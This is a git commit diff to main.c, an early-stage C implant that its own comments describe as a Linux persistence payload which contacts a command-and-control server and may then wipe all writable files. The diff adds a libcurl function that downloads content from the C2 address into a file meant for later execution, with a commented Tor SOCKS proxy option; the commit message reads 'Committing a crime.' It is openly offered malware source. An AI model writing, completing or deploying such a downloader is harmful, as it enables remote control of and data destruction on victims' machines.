29f477ef1dbc9267c81449314df49521e9e26ffa
Ezra Fast <ezrafast@tutanota.com>
2024-02-19 17:16:21 -0700

    Committing a crime.

--- main.c
+++ main.c
@@ -2,6 +2,8 @@
 #include <stdlib.h>
 #include <curl/curl.h>
 
+// Compilation: gcc main.c -o main -lcurl
+
 /* 
  * This is a pure C payload meant to target Linux systems in an effort to establish persistence. 
  * This payload will attempt to contact the C2, after which it may receive instruction to walk the file system and wipe all writable files.
@@ -10,40 +12,49 @@
  * NOTE: This payload currently implements no obfuscation or evasion techniques. These are not necessary in many cases as many targets do not have monitoring solutions on Linux servers/workstations.
  * */
 
+// Prototypes:
+
+int takeControlInstruction(void); 
+
 // Globals:
 
 int CPORT = 5678;
-char * CADDRESS = "sample-string.onion";
+char * CADDRESS = "http://www.google.com";
+
+// Main function:
 
 int main(int argc, char * argv[]) {
 	
 	// Need to cleanup the C2 callback
+	takeControlInstruction();
 
 	return 0;
 }
 
-int webRequestOverTor() {
+// Function definitions:
+
+int takeControlInstruction(void) {			// Contact C2, return string after reading contents of retrieved file
     CURL *curl;
     CURLcode res;
 
-    freopen("runMe.bin", "w", stdout);				// redirecting STDOUT to a file such that whatever is retrieved can be executed later
+    freopen("tmp", "w", stdout);				// redirecting STDOUT to a file such that whatever is retrieved can be executed later
 
     curl = curl_easy_init();									// Initializing the structure needed to make requests
     if (curl) {
-        curl_easy_setopt(curl, CURLOPT_URL, "http://XXXXXXXXXXXXXX.onion/download");		// Setting the server
+        curl_easy_setopt(curl, CURLOPT_URL, CADDRESS);		// Setting the server
 
-        // curl_easy_setopt(curl, CURLOPT_PROXY, "socks5h://127.0.0.1:9050"); 			// Setting the proxy (if used as an implant, change this to public SOCKS5 instance with HIA)
+        // curl_easy_setopt(curl, CURLOPT_PROXY, "socks5h://127.0.0.1:9050"); 			// Proxy server can be specified here
 
         res = curl_easy_perform(curl);								// Make the request
 
-        if (res != CURLE_OK)									// Handling errors
-            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+        if (res != CURLE_OK) {									// Handling errors
+            fprintf(stderr, "Web Request Failed: %s\n", curl_easy_strerror(res));
+	}
 
         curl_easy_cleanup(curl);								// Cleaning up the structure we initialized earlier
     }
 
-    // cleaning up output redirection
-    // freopen("/dev/tty", "w", stdout);		// Linux
+     freopen("/dev/tty", "w", stdout);		// Cleaning up output redirection; This is Linux specific
 
     return 0;
 }
